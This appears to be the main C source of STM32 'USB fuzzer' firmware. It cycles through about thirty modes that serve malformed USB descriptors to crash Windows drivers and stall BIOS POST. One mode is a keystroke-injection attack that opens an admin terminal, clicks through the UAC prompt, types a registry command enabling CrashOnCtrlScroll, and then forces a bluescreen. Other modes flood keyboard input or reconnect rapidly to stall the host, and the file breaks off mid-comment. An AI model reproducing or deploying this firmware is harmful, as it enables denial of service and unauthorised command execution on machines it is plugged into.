/**
 * main.c — STM32F103C8T6 USB Fuzzer (Universal Firmware)
 *
 * Single binary for all 16 fuzz modes.
 * Mode selected at runtime — no reflashing needed.
 * See main.h for full pin/mode mapping.
 */

#include "main.h"
#include "usb_device.h"
#include "uart_log.h"
#include "stm32f1xx_hal_iwdg.h"
#include "usbd_core.h"
#include "usbd_fuzzer.h"

static void SystemClock_Config(void);
static void MX_GPIO_Init(void);
static void MX_IWDG_Init(void);
static void USB_DP_Reconnect(void);
static void LED_Blink(uint8_t count);
static void LED_BlinkMode(uint8_t mode);
static uint8_t GPIO_ReadFuzzMode(void);
static uint8_t UART_HandleCmd(void);
static void    UART_PrintStatus(void);

/* Mode 17 keyboard helpers — DE QWERTZ layout */
typedef struct { uint8_t mod; uint8_t key; } HID_Key_t;
static void KBD_PressKey(uint8_t mod, uint8_t key);
static void KBD_TypeSeq(const HID_Key_t *seq, uint16_t n);
#define KBD_REGCMD_LEN 107U

extern USBD_HandleTypeDef hUsbDeviceFS;

/* Runtime fuzz mode — read from GPIO at boot, used by usbd_fuzzer.c */
uint8_t g_active_fuzz_mode = 1;

/* Auto-sequencer current step — read by usbd_fuzzer.c */
uint8_t g_auto_seq_mode = 1;

static IWDG_HandleTypeDef hiwdg;

/* -----------------------------------------------------------------------
 * Mode name table — indexed by mode number (0 unused)
 * ----------------------------------------------------------------------- */
static const char * const mode_names[FUZZ_MODE_MAX + 1] = {
    "",                                                              /* 0 unused */
    "Mode  1: bDeviceClass=0x09 Hub Impersonate",
    "Mode  2: bcdUSB=0x0300 fake USB3 on FS",
    "Mode  3: bNumConfigurations=0",
    "Mode  4: bMaxPacketSize0=0xFF",
    "Mode  5: wTotalLength=5 (underread)",
    "Mode  6: wTotalLength=0xFFFF (65535) overread",
    "Mode  7: bNumInterfaces=16",
    "Mode  8: bNumEndpoints=0 lie",
    "Mode  9: bmAttributes=0 + bInterval=0 + IfaceLen=0 loop",
    "Mode 10: String overflow 254 bytes (CVE-2024-21429)",
    "Mode 11: wDescriptorLength=0xFFFF",
    "Mode 12: wTotalLength=0xFFFF + HID bNumDesc=16 overread",
    "Mode 13: HID fuzz (nesting underflow+PUSH+LongItem+huge alloc)",
    "Mode 14: Reconnect 200ms + HID fuzz race condition",
    "Mode 15: LCG Full-Descriptor Random",
    "Mode 16: Auto-Sequencer (modes 1-15)",
    "Mode 17: Keyboard Initiated Crash (Right-Ctrl+ScrollLock x2)",
    "Mode 18: POST Hammer — 10ms reconnect bomb",
    "Mode 19: BIOS Config Flood — bNumConfigs=254 + wTotal=0xFFFF",
    "Mode 20: BIOS LangID Bomb — bLength=0xFF (4 real bytes)",
    "Mode 21: BIOS DevQual Bomb — bLength=0xFF + bcdUSB=0x0300",
    "Mode 22: Boot Disruption Sequencer (19+20+21+1+2+6+10 + reconnect bursts)",
    "Mode 23: EP0 STALL at status phase — usbport.sys retry loop",
    "Mode 24: MS OS String + ExtCompatID wTotalLength=0xFFFF",
    "Mode 25: Descriptor morph — class changes each reconnect",
    "Mode 26: IAD conflict — 3 IADs claim same interfaces",
    "Mode 27: USB MSC malformed CSW — usbstor.sys reset loop",
    "Mode 28: HID keyboard flood — 1000 reports/s",
    "Mode 29: Rapid-fire sequencer — 50ms per mode, no settle",
    "Mode 30: OMNI BOMB — all descriptor attacks simultaneously",
};

/* -----------------------------------------------------------------------
 * LCG PRNG for mode 7
 * ----------------------------------------------------------------------- */
static uint32_t lcg_state = 0xDEADBEEFUL;

static uint32_t LCG_Next(void)
{
    lcg_state = (lcg_state * 1664525UL + 1013904223UL);
    return lcg_state;
}

/* Randomise all mutable bytes [2..len-1] of the config descriptor.
 * Keeps wTotalLength high byte [3]=0x00 to avoid 16-bit overread > 255. */
void Fuzzer_RandomPatch(uint8_t *desc, uint16_t len)
{
    if (!desc || len < 4) return;
    for (uint16_t i = 2; i < len; i++) {
        desc[i] = (uint8_t)(LCG_Next() & 0xFF);
    }
    desc[3] = 0x00;
}

/* -----------------------------------------------------------------------
 * DE QWERTZ keystrokes for Mode 17 (reg add CrashOnCtrlScroll=1)
 *
 * reg add HKLM\SYSTEM\CurrentControlSet\Services\kbdhid\Parameters /v CrashOnCtrlScroll /t REG_DWORD /d 1 /f
 *
 * Capital letters: LShift modifier 0x02
 * \  = AltGr+ß  (0x40, 0x2D)
 * /  = Shift+7  (0x02, 0x24)
 * _  = Shift+-  (0x02, 0x38)  [DE minus = HID 0x38]
 * Y  = HID 0x1C + shift  (Y key on DE = physical Z position on US QWERTY)
 * ----------------------------------------------------------------------- */
static const HID_Key_t KBD_RegCmd[] = {
    /* r  e  g  <sp>  a  d  d  <sp> */
    {0x00,0x15},{0x00,0x08},{0x00,0x0A},{0x00,0x2C},
    {0x00,0x04},{0x00,0x07},{0x00,0x07},{0x00,0x2C},
    /* H  K  L  M  \ */
    {0x02,0x0B},{0x02,0x0E},{0x02,0x0F},{0x02,0x10},{0x40,0x64},
    /* S  Y  S  T  E  M  \ */
    {0x02,0x16},{0x02,0x1C},{0x02,0x16},{0x02,0x17},{0x02,0x08},{0x02,0x10},{0x40,0x64},
    /* C  u  r  r  e  n  t */
    {0x02,0x06},{0x00,0x18},{0x00,0x15},{0x00,0x15},{0x00,0x08},{0x00,0x11},{0x00,0x17},
    /* C  o  n  t  r  o  l */
    {0x02,0x06},{0x00,0x12},{0x00,0x11},{0x00,0x17},{0x00,0x15},{0x00,0x12},{0x00,0x0F},
    /* S  e  t  \ */
    {0x02,0x16},{0x00,0x08},{0x00,0x17},{0x40,0x64},
    /* S  e  r  v  i  c  e  s  \ */
    {0x02,0x16},{0x00,0x08},{0x00,0x15},{0x00,0x19},{0x00,0x0C},{0x00,0x06},{0x00,0x08},{0x00,0x16},{0x40,0x64},
    /* k  b  d  h  i  d  \ */
    {0x00,0x0E},{0x00,0x05},{0x00,0x07},{0x00,0x0B},{0x00,0x0C},{0x00,0x07},{0x40,0x64},
    /* P  a  r  a  m  e  t  e  r  s  <sp> */
    {0x02,0x13},{0x00,0x04},{0x00,0x15},{0x00,0x04},{0x00,0x10},
    {0x00,0x08},{0x00,0x17},{0x00,0x08},{0x00,0x15},{0x00,0x16},{0x00,0x2C},
    /* /  v  <sp> */
    {0x02,0x24},{0x00,0x19},{0x00,0x2C},
    /* C  r  a  s  h  O  n  C  t  r  l  S  c  r  o  l  l  <sp> */
    {0x02,0x06},{0x00,0x15},{0x00,0x04},{0x00,0x16},{0x00,0x0B},
    {0x02,0x12},{0x00,0x11},
    {0x02,0x06},{0x00,0x17},{0x00,0x15},{0x00,0x0F},
    {0x02,0x16},{0x00,0x06},{0x00,0x15},{0x00,0x12},{0x00,0x0F},{0x00,0x0F},{0x00,0x2C},
    /* /  t  <sp> */
    {0x02,0x24},{0x00,0x17},{0x00,0x2C},
    /* R  E  G  _  D  W  O  R  D  <sp> */
    {0x02,0x15},{0x02,0x08},{0x02,0x0A},{0x02,0x38},
    {0x02,0x07},{0x02,0x1A},{0x02,0x12},{0x02,0x15},{0x02,0x07},{0x00,0x2C},
    /* /  d  <sp>  1  <sp>  /  f  <Enter> */
    {0x02,0x24},{0x00,0x07},{0x00,0x2C},
    {0x00,0x1E},{0x00,0x2C},
    {0x02,0x24},{0x00,0x09},
    {0x00,0x28},
};

/* -----------------------------------------------------------------------
 * main
 * ----------------------------------------------------------------------- */
int main(void)
{
    HAL_Init();
    SystemClock_Config();
    MX_GPIO_Init();
    MX_IWDG_Init();
    UART_Log_Init();

    /* Read mode from GPIO/BKP */
    g_active_fuzz_mode = GPIO_ReadFuzzMode();
    g_auto_seq_mode    = 1;

    /* Mix boot time into LCG seed so Mode 7 varies across power cycles */
    lcg_state ^= HAL_GetTick();

    UART_Log("=== STM32 USB Fuzzer v2 ===");
    if (g_active_fuzz_mode >= 1 && g_active_fuzz_mode <= FUZZ_MODE_MAX) {
        UART_Log(mode_names[g_active_fuzz_mode]);
    }
    UART_Log("UART: 1-9=mode, a-m=10-22, n-r=23-27, t-v=28-30, s=reconnect, ?=status");

    LED_BlinkMode(g_active_fuzz_mode);

    USB_DP_Reconnect();
    HAL_Delay(100);
    MX_USB_DEVICE_Init();
    UART_Log("USB init done");

    /* -----------------------------------------------------------------------
     * Main dispatch loop.
     * UART_HandleCmd() reinits USB and returns non-zero on mode change →
     * inner loop breaks → outer loop re-dispatches with new mode.
     * ----------------------------------------------------------------------- */
    while (1) {

    if (g_active_fuzz_mode == FUZZ_MODE_RECONNECT_LOOP) {
        /* Mode 6: rapid disconnect/reconnect */
        uint32_t cycle = 0;
        while (1) {
            HAL_IWDG_Refresh(&hiwdg);
            if (UART_HandleCmd()) break;
            HAL_Delay(200U); /* 200ms: Windows mid-HID-parse when we disconnect */
            USBD_DeInit(&hUsbDeviceFS);
            HAL_Delay(10);
            USB_DP_Reconnect();
            MX_USB_DEVICE_Init();
            cycle++;
            UART_LogU32("CYCLE:", cycle);
            HAL_GPIO_TogglePin(LED_PORT, LED_PIN);
        }

    } else if (g_active_fuzz_mode == FUZZ_MODE_RANDOM) {
        /* Mode 7: full LCG random patch each reconnect */
        uint32_t cycle = 0;
        while (1) {
            HAL_IWDG_Refresh(&hiwdg);
            if (UART_HandleCmd()) break;
            HAL_Delay(1000);
            USBD_DeInit(&hUsbDeviceFS);
            HAL_Delay(20);
            USB_DP_Reconnect();
            MX_USB_DEVICE_Init();
            cycle++;
            UART_LogU32("CYCLE:", cycle);
            HAL_GPIO_TogglePin(LED_PORT, LED_PIN);
        }

    } else if (g_active_fuzz_mode == FUZZ_MODE_AUTO_SEQUENCE) {
        /* Mode 16: ordered by crash probability — aggressive vectors first.
         *
         * 10  CVE-2024-21429: 254-byte string → usbhub.sys heap overflow
         *  1  Hub impersonate + bNbrPorts=255 desc → usbhub.sys pool overread
         *  2  bcdUSB=0x0300 + malformed BOS desc → USB3 stack overread
         * 14  Race condition: 15× 200ms reconnect + Mode13 HID desc → UAF
         * 13  HID: nesting underflow + PUSH bomb + LongItem + huge alloc
         *  6  wTotalLength=0xFFFF → 65535-byte kernel buffer overread
         * 12  wTotalLength=0xFFFF + HID bNumDesc=16 → double overread
         * 11  wDescriptorLength=0xFFFF → huge HID report buffer alloc
         *  7  bNumInterfaces=16 → usbccgp.sys interface array overflow
         *  3  bNumConfigurations=0 → USB enumeration logic error
         *  8  bNumEndpoints=0 lie → EP still opens → class driver confusion
         *  9  interface bLength=0 + bmAttr=0 + bInterval=0 → parser loop
         *  4  bMaxPacketSize0=0xFF → FS packet size constraint violation
         *  5  wTotalLength=5 → config descriptor underread
         * 15  LCG full-random — catches anything the above missed
         */
        static const uint8_t seq_steps[] = {
            10, 1, 2, 14, 13, 6, 12, 11, 7, 3, 8, 9, 4, 5, 15
        };
        uint8_t  step_idx   = 0;
        uint32_t lap        = 0;
        uint32_t ok_count   = 0;
        uint32_t fail_count = 0;

        while (1) {
            g_auto_seq_mode = seq_steps[step_idx];
            UART_LogU32("SEQ:step=", g_auto_seq_mode);
            LED_BlinkMode(g_auto_seq_mode);

            USBD_DeInit(&hUsbDeviceFS);
            HAL_Delay(50);
            USB_DP_Reconnect();
            MX_USB_DEVICE_Init();

            if (g_auto_seq_mode == FUZZ_MODE_RECONNECT_LOOP) {
                /* Mode 6 step: 15× rapid reconnect at 200ms each.
                 * Device disconnects while Windows is mid-HID-parse → UAF window. */
                for (uint8_t r = 0; r < 15U; r++) {
                    HAL_Delay(200U);
                    HAL_IWDG_Refresh(&hiwdg);
                    USBD_DeInit(&hUsbDeviceFS);
                    HAL_Delay(20U);
                    USB_DP_Reconnect();
                    MX_USB_DEVICE_Init();
                }
                ok_count++;
                UART_Log("SEQ:6:race=done");
            } else {
                /* All other modes: wait up to 500ms for CONFIGURED state */
                uint32_t t0 = HAL_GetTick();
                uint8_t  enum_ok = 0;
                while ((HAL_GetTick() - t0) < 500U) {
                    HAL_IWDG_Refresh(&hiwdg);
                    if (hUsbDeviceFS.dev_state == USBD_STATE_CONFIGURED) {
                        enum_ok = 1;
                        break;
                    }
                    HAL_Delay(10);
                }

                if (enum_ok) { ok_count++;   UART_Log("SEQ:enum=OK"); }
                else          { fail_count++; UART_Log("SEQ:enum=FAIL"); }

                /* Modes that attack post-CONFIGURED drivers get extra dwell */
                uint32_t dwell;
                if (g_auto_seq_mode == FUZZ_MODE_HID_REPORT_FUZZ ||
                    g_auto_seq_mode == FUZZ_MODE_HID_DESCLEN_MAX  ||
                    g_auto_seq_mode == FUZZ_MODE_HID_BCDVER) {
                    dwell = enum_ok ? 5000U : AUTO_SEQ_STEP_MS_SLOW;
                } else {
                    dwell = enum_ok ? AUTO_SEQ_STEP_MS : AUTO_SEQ_STEP_MS_SLOW;
                }
                uint32_t start = HAL_GetTick();
                while ((HAL_GetTick() - start) < dwell) {
                    HAL_IWDG_Refresh(&hiwdg);
                    HAL_Delay(IWDG_KICK_INTERVAL_MS);
                }
            }

            if (UART_HandleCmd()) break;

            step_idx++;
            if (step_idx >= (uint8_t)(sizeof(seq_steps) / sizeof(seq_steps[0]))) {
                step_idx = 0;
                lap++;
                UART_LogU32("SEQ:LAP=",  lap);
                UART_LogU32("SEQ:ok=",   ok_count);
                UART_LogU32("SEQ:fail=", fail_count);
            }
        }

    } else if (g_active_fuzz_mode == FUZZ_MODE_KBD_CRASH) {
        /* Mode 17: Fully autonomous keyboard BSOD — NOT in auto-sequencer.
         *
         * Phase 1: Wait for USB enumeration (kbdhid loads with CrashOnCtrlScroll=0)
         * Phase 2: Win+X → A → opens admin terminal (Win10: PowerShell, Win11: Terminal)
         * Phase 3: UAC dialog appears → Enter (confirms "Yes")
         * Phase 4: Wait for admin terminal window
         * Phase 5: Type reg add command (DE QWERTZ layout) to set CrashOnCtrlScroll=1
         * Phase 6: USB disconnect/reconnect → kbdhid.sys re-initializes, reads new value
         * Phase 7: Right-Ctrl + ScrollLock × 2 → BSOD 0xE2 MANUALLY_INITIATED_CRASH
         *
         * 4× long blinks shown by LED_BlinkMode(17) at mode entry as a warning. */
        UART_Log("KBD_CRASH: phase1 waiting for USB enum...");
        {
            uint32_t t0 = HAL_GetTick();
            while ((HAL_GetTick() - t0) < 5000U) {
                HAL_IWDG_Refresh(&hiwdg);
                if (hUsbDeviceFS.dev_state == USBD_STATE_CONFIGURED) break;
                HAL_Delay(100U);
            }
        }
        if (hUsbDeviceFS.dev_state != USBD_STATE_CONFIGURED) {
            UART_Log("KBD_CRASH: not configured, aborting");
            goto kbd_idle;
        }
        UART_Log("KBD_CRASH: phase2 Win+X -> A (admin terminal)");
        KBD_PressKey(0x08U, 0x1BU); /* Win+X */
        HAL_Delay(600U);
        KBD_PressKey(0x00U, 0x04U); /* a (Terminal/Admin) */

        UART_Log("KBD_CRASH: phase3 waiting for UAC (2s)");
        HAL_Delay(2000U);
        KBD_PressKey(0x00U, 0x28U); /* Enter (accept UAC Yes) */

        UART_Log("KBD_CRASH: phase4 waiting for admin terminal (3s)");
        {
            uint32_t t0 = HAL_GetTick();
            while ((HAL_GetTick() - t0) < 3000U) {
                HAL_IWDG_Refresh(&hiwdg);
                HAL_Delay(200U);
            }
        }

        UART_Log("KBD_CRASH: phase5 typing reg add command (DE QWERTZ)");
        KBD_TypeSeq(KBD_RegCmd, KBD_REGCMD_LEN);
        HAL_Delay(1000U); /* wait for reg.exe to complete */

        UART_Log("KBD_CRASH: phase6 USB reconnect (kbdhid reloads registry)");
        USBD_DeInit(&hUsbDeviceFS);
        HAL_Delay(100U);
        USB_DP_Reconnect();
        MX_USB_DEVICE_Init();
        {
            uint32_t t0 = HAL_GetTick();
            while ((HAL_GetTick() - t0) < 5000U) {
                HAL_IWDG_Refresh(&hiwdg);
                if (hUsbDeviceFS.dev_state == USBD_STATE_CONFIGURED) break;
                HAL_Delay(100U);
            }
        }
        HAL_Delay(500U); /* extra settle: kbdhid finishes init */

        if (hUsbDeviceFS.dev_state != USBD_STATE_CONFIGURED) {
            UART_Log("KBD_CRASH: not reconfigured, aborting");
            goto kbd_idle;
        }

        UART_Log("KBD_CRASH: phase7 Right-Ctrl+ScrollLock x2 -> BSOD 0xE2");
        {
            uint8_t dn[8] = {0x10, 0x00, 0x47, 0x00, 0x00, 0x00, 0x00, 0x00};
            uint8_t up[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
            USBD_FUZZER_Transmit(&hUsbDeviceFS, dn, sizeof(dn));
            HAL_Delay(50U);
            USBD_FUZZER_Transmit(&hUsbDeviceFS, up, sizeof(up));
            HAL_Delay(50U);
            USBD_FUZZER_Transmit(&hUsbDeviceFS, dn, sizeof(dn));
            HAL_Delay(50U);
            USBD_FUZZER_Transmit(&hUsbDeviceFS, up, sizeof(up));
        }
        UART_Log("KBD_CRASH: sequence sent — BSOD expected");

        kbd_idle:
        while (1) {
            HAL_IWDG_Refresh(&hiwdg);
            HAL_Delay(IWDG_KICK_INTERVAL_MS);
            if (UART_HandleCmd()) break;
        }

    } else if (g_active_fuzz_mode == FUZZ_MODE_POST_RECONNECT) {
        /* Mode 18: Ultra-rapid reconnect (10ms off / 20ms on).
         * BIOS USB enumeration requires ~100ms stable connection; at 10ms the
         * device never stays connected long enough to receive SET_ADDRESS.
         * BIOS USB init hangs waiting for address assignment → POST stall. */
        uint32_t cycle = 0;
        while (1) {
            HAL_IWDG_Refresh(&hiwdg);
            if (UART_HandleCmd()) break;
            USBD_DeInit(&hUsbDeviceFS);
            HAL_Delay(10U);
            USB_DP_Reconnect();
            MX_USB_DEVICE_Init();
            HAL_Delay(20U);
            cycle++;
            if ((cycle % 100U) == 0U) UART_LogU32("POST_HAMMER:", cycle);
            HAL_GPIO_TogglePin(LED_PORT, LED_PIN);
        }

    } else if (g_active_fuzz_mode == FUZZ_MODE_BOOT_DISRUPT) {
        /* Mode 22: Boot disruption sequencer.
         *
         * Cycles through all POST-effective attack vectors, each for 3s
         * (BIOS enumerates and parses the malformed descriptor), then fires
         * 20× 10ms rapid reconnect bursts to stress the BIOS USB state machine.
         *
         * Sequence (crash probability order):
         *  19 — bNumConfigs=254 + wTotal=0xFFFF → BIOS config enum loop
         *  20 — LangID bLength=0xFF → BIOS string parser OOB read
         *  21 — DevQual bLength=0xFF + bcdUSB=0x0300 → HS negotiation crash
         *   1 — Hub 255 ports + truncated bitmap → usbhub.sys/BIOS pool OOB
         *   2 — bcdUSB=0x0300 + BOS 85→45 bytes + cap bLength=255
         *   6 — wTotalLength=0xFFFF → BIOS allocates 64 KB, reads uninitialized
         *  10 — String 254 bytes → BIOS string buffer overflow
         */
        static const uint8_t boot_seq[] = {19, 20, 21, 1, 2, 6, 10};
        uint8_t step = 0;
        while (1) {
            g_auto_seq_mode = boot_seq[step];
            UART_LogU32("BOOT_DISRUPT:mode=", g_auto_seq_mode);
            LED_BlinkMode(g_auto_seq_mode);

            USBD_DeInit(&hUsbDeviceFS);
            HAL_Delay(50U);
            USB_DP_Reconnect();
            MX_USB_DEVICE_Init();

            /* 3s dwell — let BIOS/bootloader parse the malformed descriptor */
            {
                uint32_t t0 = HAL_GetTick();
                while ((HAL_GetTick() - t0) < 3000U) {
                    HAL_IWDG_Refresh(&hiwdg);
                    HAL_Delay(100U);
                }
            }

            /* 20× rapid reconnect burst (10ms off / 20ms on) */
            for (uint8_t r = 0; r < 20U; r++) {
                USBD_DeInit(&hUsbDeviceFS);
                HAL_Delay(10U);
                USB_DP_Reconnect();
                MX_USB_DEVICE_Init();
                HAL_Delay(20U);
                HAL_IWDG_Refresh(&hiwdg);
            }

            if (UART_HandleCmd()) break;
            step = (uint8_t)((step + 1U) % (uint8_t)(sizeof(boot_seq) / sizeof(boot_seq[0])));
        }

    } else if (g_active_fuzz_mode == FUZZ_MODE_DESC_MORPH) {
        /* Mode 25: Same VID/PID morphs device class on each reconnect.
         * Phase 0 → HID, Phase 1 → Hub, Phase 2 → random garbage.
         * Windows re-binds the wrong driver each cycle. */
        extern uint8_t g_morph_phase;
        g_morph_phase = 0;
        uint32_t cycle = 0;
        while (1) {
            UART_LogU32("MORPH:phase=", g_morph_phase);
            USBD_DeInit(&hUsbDeviceFS);
            HAL_Delay(30U);
            USB_DP_Reconnect();
            MX_USB_DEVICE_Init();
            {
                uint32_t t0 = HAL_GetTick();
                while ((HAL_GetTick() - t0) < 2000U) {
                    HAL_IWDG_Refresh(&hiwdg);
                    HAL_Delay(100U);
                }
            }
            g_morph_phase = (uint8_t)((g_morph_phase + 1U) % 3U);
            cycle++;
            UART_LogU32("MORPH:cycle=", cycle);
            HAL_GPIO_TogglePin(LED_PORT, LED_PIN);
            if (UART_HandleCmd()) break;
        }

    } else if (g_active_fuzz_mode == FUZZ_MODE_HID_FLOOD) {
        /* Mode 28: HID boot keyboard flood.
         * After enumeration as keyboard, alternates key-all-down / all-up at max rate.
         * kbdhid.sys processes every report; at 1000 rpt/s the input subsystem stalls. */
        UART_Log("HID_FLOOD: waiting for enum...");
        {
            uint32_t t0 = HAL_GetTick();
            while ((HAL_GetTick() - t0) < 5000U) {
                HAL_IWDG_Refresh(&hiwdg);
                if (hUsbDeviceFS.dev_state == USBD_STATE_CONFIGURED) break;
                HAL_Delay(50U);
            }
        }
        UART_Log("HID_FLOOD: flooding...");
        uint32_t flood_kick = HAL_GetTick();
        uint8_t  toggle = 0;
        while (1) {
            uint8_t rpt_dn[8] = {0xFF, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            uint8_t rpt_up[8] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
            if (hUsbDeviceFS.dev_state == USBD_STATE_CONFIGURED) {
                USBD_FUZZER_Transmit(&hUsbDeviceFS, toggle ? rpt_dn : rpt_up, 8U);
                toggle ^= 1U;
            }
            HAL_Delay(1U); /* 1ms → ~1000 rpt/s */
            uint32_t now = HAL_GetTick();
            if ((now - flood_kick) >= IWDG_KICK_INTERVAL_MS) {
                HAL_IWDG_Refresh(&hiwdg);
                flood_kick = now;
            }
            if (UART_HandleCmd()) break;
        }

    } else if (g_active_fuzz_mode == FUZZ_MODE_RAPID_SEQ) {
        /* Mode 29: 50ms rapid-fire sequencer.
         * Enumerates each mode for only 50ms — USB stack gets no recovery time.
         * Covers all 30 modes including BIOS modes, HID bombs, and EP0 attacks. */
        static const uint8_t rseq[] = {
            10, 1, 2, 13, 14, 6, 12, 11, 7, 3, 8, 9, 4, 5, 15,
            19, 20, 21, 22, 23, 24, 26, 27, 30
        };
        uint8_t ridx = 0;
        uint32_t rlap = 0;
        while (1) {
            g_auto_seq_mode = rseq[ridx];
            UART_LogU32("RSEQ:mode=", g_auto_seq_mode);
            USBD_DeInit(&hUsbDeviceFS);
            HAL_Delay(20U);
            USB_DP_Reconnect();
            MX_USB_DEVICE_Init();
            {
                uint32_t t0 = HAL_GetTick();
                while ((HAL_GetTick() - t0) < 50U) {
                    HAL_IWDG_Refresh(&hiwdg);
                    HAL_Delay(5U);
                }
            }
            ridx++;
            if (ridx >= (uint8_t)(sizeof(rseq)/sizeof(rseq[0]))) {
                ridx = 0; rlap++;
                UART_LogU32("RSEQ:LAP=", rlap);
            }
            if (UART_HandleCmd()) break;
        }

    } else {
        /* Modes 1–30 static: stay connected, serve corrupted descriptor.
         * PB2=GND: LED blinks mode number every 3s (heartbeat, shows active mode).
         * PB2=open: simple 1Hz toggle. */
        uint32_t last_kick      = 0;
        uint32_t last_heartbeat = 0;
        uint8_t  frozen = (HAL_GPIO_ReadPin(MODE_SEL_PORT, MODE_SEL_PIN0) == GPIO_PIN_RESET);
        while (1) {
            uint32_t now = HAL_GetTick();
            if ((now - last_kick) >= IWDG_KICK_INTERVAL_MS) {
                HAL_IWDG_Refresh(&hiwdg);
                last_kick = now;
            }
            if (frozen) {
                if ((now - last_heartbeat) >= 3000U) {
                    LED_BlinkMode(g_active_fuzz_mode);
                    last_heartbeat = HAL_GetTick();
                }
            } else {
                if ((now - last_heartbeat) >= 1000U) {
                    HAL_GPIO_TogglePin(LED_PORT, LED_PIN);
                    last_heartbeat = now;
                }
            }
            if (UART_HandleCmd()) break;
        }
    }

    } /* end outer while(1) */
}

/* -----------------------------------------------------------------------
 * GPIO_ReadFuzzMode
 *
 * PB2=open  → Reset-Zähler: BKP++, Modus 1→2→…→16→1
 * PB2=GND   → Eingefroren: BKP unveränderter Modus; PB3/PB4 wählen Bank:
 *               PB4 PB3  Bank  Modi
 *                0   0    0    1–4
 *                0   1    1    5–8
 *                1   0    2    9–12
 *                1   1    3    13–16
 *             BKP-Wert (1–4) = Intra-Bank-Offset → final_mode = bank*4 + offset
 * ----------------------------------------------------------------------- */
static uint8_t GPIO_ReadFuzzMode(void)
{
    HAL_Delay(5); /* pull-up settle */

    __HAL_RCC_PWR_CLK_ENABLE();
    __HAL_RCC_BKP_CLK_ENABLE();
    HAL_PWR_EnableBkUpAccess();

    uint16_t stored = BKP->DR1;

    if (HAL_GPIO_ReadPin(MODE_SEL_PORT, MODE_SEL_PIN0) == GPIO_PIN_RESET) {
        /* Eingefroren — PB3/PB4 Bank-Select */
        uint8_t b3 = (HAL_GPIO_ReadPin(MODE_SEL_PORT, MODE_SEL_PIN1) == GPIO_PIN_RESET) ? 1U : 0U;
        uint8_t b4 = (HAL_GPIO_ReadPin(MODE_SEL_PORT, MODE_SEL_PIN2) == GPIO_PIN_RESET) ? 1U : 0U;
        uint8_t bank = (b4 << 1) | b3;  /* 0–3 */

        /* Intra-bank offset 1–4 */
        if (stored < 1 || stored > 4) stored = 1;
        uint8_t mode = (uint8_t)(bank * 4U + stored);
        if (mode < 1 || mode > FUZZ_MODE_MAX) mode = 1;
        BKP->DR1 = stored;
        UART_LogU32("Frozen bank=", bank);
        UART_LogU32("Frozen mode=", mode);
        return mode;
    }

    /* Reset-Zähler */
    if (stored < 1 || stored > FUZZ_MODE_MAX) stored = 1;
    else stored = (uint16_t)((stored % (uint16_t)FUZZ_MODE_MAX) + 1U);
    BKP->DR1 = stored;
    UART_LogU32("Reset->mode=", stored);
    return (uint8_t)stored;
}

/* -----------------------------------------------------------------------
 * UART_HandleCmd — non-blocking command dispatch
 *
 * Returns non-zero when mode changed (caller should break inner loop).
 * '?' → print status (no mode change, returns 0)
 * 's' → USB reconnect (no mode change, returns 0)
 * 1–16 → mode switch (returns new mode)
 * ----------------------------------------------------------------------- */
static uint8_t UART_HandleCmd(void)
{
    uint8_t cmd = UART_TryReadCmd();
    if (cmd == 0) return 0;

    if (cmd == (uint8_t)'?') {
        UART_PrintStatus();
        return 0;
    }

    if (cmd == (uint8_t)'s') {
        UART_Log("RECONNECT");
        USBD_DeInit(&hUsbDeviceFS);
        HAL_Delay(20);
        USB_DP_Reconnect();
        MX_USB_DEVICE_Init();
        return 0;
    }

    /* Mode switch: 1–16 */
    if (cmd >= 1 && cmd <= FUZZ_MODE_MAX) {
        UART_LogU32("UART->mode=", cmd);
        g_active_fuzz_mode = cmd;
        g_auto_seq_mode    = 1;

        __HAL_RCC_PWR_CLK_ENABLE();
        __HAL_RCC_BKP_CLK_ENABLE();
        HAL_PWR_EnableBkUpAccess();
        BKP->DR1 = (uint16_t)cmd;

        UART_Log(mode_names[cmd]);
        LED_BlinkMode(cmd);
        USBD_DeInit(&hUsbDeviceFS);
        HAL_Delay(20);
        USB_DP_Reconnect();
        MX_USB_DEVICE_Init();
        return cmd;
    }

    return 0;
}

/* -----------------------------------------------------------------------
 * UART_PrintStatus — '?' command response
 * ----------------------------------------------------------------------- */
static void UART_PrintStatus(void)
{
    uint8_t frozen = (HAL_GPIO_ReadPin(MODE_SEL_PORT, MODE_SEL_PIN0) == GPIO_PIN_RESET);
    UART_Log("--- STATUS ---");
    if (g_active_fuzz_mode >= 1 && g_active_fuzz_mode <= FUZZ_MODE_MAX) {
        UART_Log(mode_names[g_active_fuzz_mode]);
    }
    UART_LogU32("STAT:frozen=", frozen);
    UART_LogU32("STAT:seq_step=", g_auto_seq_mode);
    UART_LogU32("STAT:bkp=", BKP->DR1);
    UART_Log("--------------");
}

/* -----------------------------------------------------------------------
 * HID keyboard helpers — DE QWERTZ layout (Mode 17)
 *
 * Modifier bits: b1=LShift  b3=LWin  b6=RAlt(AltGr)
 * DE QWERTZ specifics:
 *   Y/Z swapped: HID 0x1C = Y, HID 0x1D = Z on DE
 *   \   = AltGr+ß  (0x40, 0x2D)
 *   /   = Shift+7  (0x02, 0x24)
 *   _   = Shift+-  (0x02, 0x38)  [DE minus key = HID 0x38]
 * ----------------------------------------------------------------------- */
static void KBD_PressKey(uint8_t mod, uint8_t key)
{
    uint8_t dn[8] = {mod, 0, key, 0, 0, 0, 0, 0};
    uint8_t up[8] = {0};
    USBD_FUZZER_Transmit(&hUsbDeviceFS, dn, sizeof(dn));
    HAL_Delay(30U);
    USBD_FUZZER_Transmit(&hUsbDeviceFS, up, sizeof(up));
    HAL_Delay(30U);
    HAL_IWDG_Refresh(&hiwdg);
}

static void KBD_TypeSeq(const HID_Key_t *seq, uint16_t n)
{
    for (uint16_t i = 0; i < n; i++)
        KBD_PressKey(seq[i].mod, seq[i].key);
}


/* -----------------------------------------------------------------------
 * LED_Blink — blink N times (active low on Blue Pill)
 * ----------------------------------------------------------------------- */
static void LED_Blink(uint8_t count)
{
    for (uint8_t i = 0; i < count; i++) {
        HAL_GPIO_WritePin(LED_PORT, LED_PIN, GPIO_PIN_RESET); /* on */
        HAL_Delay(150);
        HAL_GPIO_WritePin(LED_PORT, LED_PIN, GPIO_PIN_SET);   /* off */
        HAL_Delay(150);
    }
    HAL_Delay(400);
}

/* LED_BlinkMode — shows mode number:
 * Modes  1–8  : N short blinks
 * Modes 9–16  : 1 long (600ms) + (mode-8) short
 * Mode  17    : 4 long (800ms) — WARNING: keyboard crash
